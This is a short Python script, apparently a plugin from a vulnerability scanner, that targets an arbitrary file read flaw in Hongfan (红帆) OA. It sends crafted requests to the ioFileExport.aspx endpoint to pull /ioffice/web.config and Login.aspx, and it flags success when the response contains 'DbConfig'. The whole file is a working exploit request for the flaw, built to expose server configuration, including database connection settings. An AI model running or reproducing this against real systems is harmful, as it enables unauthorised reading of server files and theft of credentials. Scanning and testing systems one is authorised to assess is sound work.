import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3

def 红帆OA_IOFILE_任意文件读取(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target_url1 = urldata + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"
    target_url2 = urldata + "ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        urllib3.disable_warnings()
        res1 = requests.get(url=target_url1, headers=headers, verify=False, timeout=10)
        res2 = requests.get(url=target_url2, headers=headers, verify=False, timeout=10)
        if res1.status_code == 200 and "DbConfig" in res1.text:
            print(Vcolors.RED + "[+] 存在红帆任意文件读取:{}".format(target_url1) +Vcolors.ENDC)
        if res2.status_code == 200:
            print(Vcolors.RED + "[+] 存在红帆任意文件读取:{}".format(target_url2) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在红帆任意文件读取" + Vcolors.ENDC)
    except Exception as e:
        logging.error("红帆OA_IOFILE_任意文件读取脚本出现异常")



